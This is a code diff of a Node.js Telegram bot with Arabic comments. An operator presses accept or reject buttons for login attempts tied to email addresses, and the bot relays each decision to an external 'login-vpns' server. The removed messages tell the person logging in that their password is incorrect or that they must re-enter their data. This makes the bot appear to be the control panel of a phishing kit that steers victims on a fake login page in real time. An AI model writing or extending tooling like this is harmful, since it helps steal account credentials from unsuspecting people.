@@ -10,20 +10,32 @@ bot.on("polling_error", (error) => {
 
 // عند الضغط على زر Accept أو Reject
 bot.on('callback_query', async (callbackQuery) => {
-    const action = callbackQuery.data;
+    const data = callbackQuery.data; // مثال: accept|email@example.com
     const chatId = callbackQuery.message.chat.id;
 
-    console.log('📥 تم الضغط على الزر:', action);
+    console.log('📥 تم الضغط على الزر:', data);
+
+    const baseUrl = 'https://login-vpns.onrender.com';
 
     try {
+        const [action, userId] = data.split('|'); // تفصيل: 'accept' و 'email@example.com'
+
+        if (!action || !userId) {
+            bot.sendMessage(chatId, '⚠️ بيانات غير صحيحة في الزر.');
+            return;
+        }
+
+        // إرسال القرار للسيرفر
+        await fetch(`${baseUrl}/update-status?userId=${encodeURIComponent(userId)}&status=${action}`);
+
         if (action === 'accept') {
-            bot.sendMessage(chatId, '✅ تم قبول محاولة تسجيل الدخول. يرجى إعادة إدخال بياناتك في الموقع.');
+            bot.sendMessage(chatId, `✅ تم قبول محاولة تسجيل الدخول لـ ${userId}.`);
         } else if (action === 'reject') {
-            bot.sendMessage(chatId, '❌ كلمة المرور التي أدخلتها غير صحيحة. يرجى المحاولة مجددًا.');
+            bot.sendMessage(chatId, `❌ تم رفض محاولة تسجيل الدخول لـ ${userId}.`);
         }
     } catch (err) {
         console.error('❌ خطأ أثناء المعالجة:', err);
-        bot.sendMessage(chatId, '⚠️ حدث خطأ أثناء المعالجة، حاول مرة أخرى.');
+        bot.sendMessage(chatId, '⚠️ حدث خطأ أثناء إرسال القرار للسيرفر.');
     }
 
     bot.answerCallbackQuery(callbackQuery.id);
